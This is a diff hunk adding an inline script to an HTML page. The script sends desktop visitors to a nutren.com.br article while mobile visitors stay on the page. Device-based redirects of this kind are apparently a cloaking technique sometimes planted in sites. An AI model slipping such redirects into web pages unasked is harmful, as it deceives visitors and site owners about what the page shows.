@@ -784,6 +784,15 @@
 
   </head>
   <body>
+    <script>
+(function () {
+    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
+
+    if (!isMobile) {
+        window.location.replace("https://www.nutren.com.br/mulher/artigos/ciencia-da-nutricao/bem-estar-saude");
+    }
+})();
+</script>
 <!-- Google Tag Manager (noscript) -->
 <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLP79R79"
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
